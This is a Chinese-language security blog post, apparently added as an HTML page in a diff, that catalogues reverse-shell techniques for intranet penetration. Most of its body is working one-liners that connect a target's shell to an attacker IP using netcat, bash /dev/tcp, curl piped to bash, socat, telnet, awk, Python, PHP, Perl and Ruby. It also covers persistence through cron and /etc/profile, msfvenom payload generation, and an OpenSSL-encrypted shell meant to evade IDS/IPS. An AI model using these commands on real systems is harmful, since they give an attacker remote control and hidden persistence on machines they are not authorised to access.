@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-hacker.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-hacker.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-hacker.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":false,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言以前学过的内容，记录一遍。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透之反弹shell">
+<meta property="og:url" content="http://example.com/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/index.html">
+<meta property="og:site_name" content="Scammer">
+<meta property="og:description" content="前言以前学过的内容，记录一遍。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/simg/shell-1.png">
+<meta property="article:published_time" content="2023-08-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-28T08:33:45.181Z">
+<meta property="article:author" content="Bron">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/simg/shell-1.png">
+
+<link rel="canonical" href="http://example.com/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  <title>内网渗透之反弹shell | Scammer</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Scammer" type="application/atom+xml">
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#000000;--blockquote-color:#bbb;--link-color:#000000;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#ccc;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#161616;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#8a2be2;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Scammer</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">55</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">61</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">168</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Elaina.png">
+      <meta itemprop="name" content="Bron">
+      <meta itemprop="description" content="原谅我这一生不羁放纵爱自由">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Scammer">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网渗透之反弹shell
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-28 00:00:00 / 修改时间：16:33:45" itemprop="dateCreated datePublished" datetime="2023-08-28T00:00:00+08:00">2023-08-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%BC%B9shell/" itemprop="url" rel="index"><span itemprop="name">反弹shell</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前学过的内容，记录一遍。</p>
+<span id="more"></span>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务器，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>
+<h1 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h1><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p>
+<h1 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h1><p>反弹shell通常适用于如下几种情况：<br>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。<br>目标机端口被占用。<br>目标机位于互联网，或IP会动态变化，攻击机无法连接。<br>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知。</p>
+<p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p>
+<p>反向连接就是，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序。</p>
+<p>反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。</p>
+<h1 id="利用netcat反弹shell"><a href="#利用netcat反弹shell" class="headerlink" title="利用netcat反弹shell"></a>利用netcat反弹shell</h1><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p>
+<p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
+
+<p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p>
+<p>攻击机开启本地监听：<br><code>netcat -lvvp 2333</code></p>
+<p>目标机主动连接攻击机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netcat 47.xxx.xxx.72 2333 -e /bin/bash</span><br><span class="line"><span class="comment"># nc &lt;攻击机IP&gt; &lt;攻击机端口&gt; -e /bin/bash</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="利用bash反弹shell"><a href="#利用bash反弹shell" class="headerlink" title="利用bash反弹shell"></a>利用bash反弹shell</h1><p>使用bash结合重定向方法的一句话反弹shell命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line">或</span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span></span><br><span class="line"><span class="comment"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span></span><br></pre></td></tr></table></figure>
+
+<p>命令详解：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -i  <span class="comment"># 产生一个bash交互环境</span></span><br><span class="line">&gt;&amp;       <span class="comment"># 将联合符号前面的内容与后面的内容相结合，然后一起重定向给后者</span></span><br><span class="line">/dev/tcp/47.xxx.xxx.72/2333  </span><br><span class="line"><span class="comment"># Linux环境中所有内容都是以文件的形式存在的，</span></span><br><span class="line"><span class="comment"># 该命令是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</span></span><br><span class="line">0&gt;&amp;1     <span class="comment"># 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容</span></span><br></pre></td></tr></table></figure>
+
+<p>完整解读：<br>bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。</p>
+<p>攻击机开启监听：<br><code>nc -lvvp 2333</code></p>
+<p>目标机主动连接攻击机<br><code>bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></p>
+<h1 id="Curl配合bash反弹shell"><a href="#Curl配合bash反弹shell" class="headerlink" title="Curl配合bash反弹shell"></a>Curl配合bash反弹shell</h1><p>这里的操作借助了Linux中的管道。</p>
+<p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>并开启2333端口监听<br>然后在目标机上执行如下，即可反弹shell：<br><code>curl 47.xxx.xxx.72|bash</code></p>
+<p><code>curl IP|bash</code> 中的IP可以是任意格式的，十进制，十六进制，二进制等。</p>
+<h1 id="将反弹shell命令写入定时任务"><a href="#将反弹shell命令写入定时任务" class="headerlink" title="将反弹shell命令写入定时任务"></a>将反弹shell命令写入定时任务</h1><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。<br>比如，当前用户名为root，我们就要将下面内容写入到 <code>/var/spool/cron/root</code> 中。(centos系列主机)<br>比如，当前用户名为root，我们就要将下面内容写入到 <code>/var/spool/cron/crontabs/root</code> 中。(Debian&#x2F;Ubuntu系列主机)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="将反弹shell的命令写入-x2F-etc-x2F-profile文件"><a href="#将反弹shell的命令写入-x2F-etc-x2F-profile文件" class="headerlink" title="将反弹shell的命令写入&#x2F;etc&#x2F;profile文件"></a>将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</h1><p>将以下的反弹shell命令写入&#x2F;etc&#x2F;profile文件中，&#x2F;etc&#x2F;profile中的内容会在用户打开bash窗口时执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># 最后面的&amp;为的是防止管理员无法输入命令</span></span><br></pre></td></tr></table></figure>
+
+<p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell</p>
+<h1 id="利用Socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用Socat反弹shell</h1><p>Socat是Linux下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，可以看作netcat的加强版。<br><a target="_blank" rel="noopener" href="http://brieflyx.me/2015/linux-tools/socat-introduction/">SOCAT 简介</a></p>
+<p>安装socat的方法很简单：<br>Ubuntu等可以直接使用 <code>apt-get install socat</code> 命令进行安装<br>也可在 <a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/">官网</a> 下源码包</p>
+<p>攻击机开启监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:2333 -</span><br><span class="line">或</span><br><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
+
+<p>目标机主动连接攻击机：<br><code>socat tcp-connect:47.xxx.xxx.72:2333 exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane</code></p>
+<h1 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h1><p>当nc和&#x2F;dev&#x2F;tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以用Telnet反弹shell</p>
+<p>方法一：<br>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p>
+<p>目标机主动连接攻击机：<br><code>mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</code></p>
+<p>方法二：<br>攻击机需要开启两个本地监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line">nc -lvvp 4000</span><br></pre></td></tr></table></figure>
+
+<p>目标机主动连接攻击机：<br><code>telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000</code></p>
+<p>获得shell后，在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。</p>
+<h1 id="利用awk反弹shell"><a href="#利用awk反弹shell" class="headerlink" title="利用awk反弹shell"></a>利用awk反弹shell</h1><p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。在众多的Linux发行版本中，都会预装这个应用程序。<br>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p>
+<p>目标机主动连接攻击机：<br><code>awk &#39;BEGIN&#123;s=&quot;/inet/tcp/0/47.xxx.xxx.72/2333&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#39;</code></p>
+<h1 id="各种脚本反弹shell"><a href="#各种脚本反弹shell" class="headerlink" title="各种脚本反弹shell"></a>各种脚本反弹shell</h1><h2 id="python脚本反弹shell"><a href="#python脚本反弹shell" class="headerlink" title="python脚本反弹shell"></a>python脚本反弹shell</h2><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>
+<p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p>
+<p>目标主机主动连接攻击机：<br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
+<h2 id="PHP脚本反弹shell"><a href="#PHP脚本反弹shell" class="headerlink" title="PHP脚本反弹shell"></a>PHP脚本反弹shell</h2><p>当目标主机上有phph环境时，我们可以用php来反弹shell。</p>
+<p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p>
+<p>目标机主动连接攻击机：<br><code>php -r &#39;$sock=fsockopen(&quot;47.xxx.xxx.72&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
+<h2 id="Perl脚本反弹shell"><a href="#Perl脚本反弹shell" class="headerlink" title="Perl脚本反弹shell"></a>Perl脚本反弹shell</h2><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p>
+<p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p>
+<p>目标机主动连接攻击机：<br><code>perl -e &#39;use Socket;$i=&quot;47.101.57.72&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></p>
+<h2 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a>Ruby脚本反弹shell</h2><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p>
+<p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p>
+<p>目标机主动连接攻击机：<br><code>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; 或 ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</code></p>
+<h1 id="使用Metasploit生成反弹shell用的一句话"><a href="#使用Metasploit生成反弹shell用的一句话" class="headerlink" title="使用Metasploit生成反弹shell用的一句话"></a>使用Metasploit生成反弹shell用的一句话</h1><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p>
+<p>我们可以直接使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：<br><code>msfvenom -l payloads | grep &#39;cmd/unix/reverse&#39;</code></p>
+<p>metasploit支持生成反弹shell一句话的类型非常丰富，可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：<br><code>msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw</code></p>
+<p>将生成的python反弹shell的一句话在目标主机上执行即可</p>
+<h1 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h1><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p>
+<ul>
+<li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</li>
+<li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li>
+<li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li>
+</ul>
+<p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p>
+<p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。</p>
+<p>只需在获取的shell里面输入如下命令，即可模拟一个终端设备：<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p><img src="/simg/shell-1.png" alt="模拟终端设备"></p>
+<p>如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。</p>
+<h1 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h1><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p>
+<h2 id="OpenSSL简介"><a href="#OpenSSL简介" class="headerlink" title="OpenSSL简介"></a>OpenSSL简介</h2><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p>
+<p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p>
+<p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：<br><code>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</code></p>
+<p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可</p>
+<h2 id="使用OpenSSL反弹加密shell-1"><a href="#使用OpenSSL反弹加密shell-1" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h2><p>实验环境：Linux</p>
+<p>目标机：<br>系统：Linux<br>IP：192.168.1.8</p>
+<p>攻击机：<br>系统：Linux<br>IP：47.xxx.xxx.72</p>
+<p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：<br><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</code></p>
+<p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL&#x2F;TLS server。</p>
+<p>这时在目标机进行反弹 shell 操作，命令为：<br><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quite -connect 47.xxx.xxx.72:2333 &gt; /tmp/s; rm /tmp/s</code></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>我很可爱，请给我钱</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Bron
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/" title="内网渗透之反弹shell">http://example.com/2023/08/28/内网渗透之反弹shell/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/Elaina_Anime">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
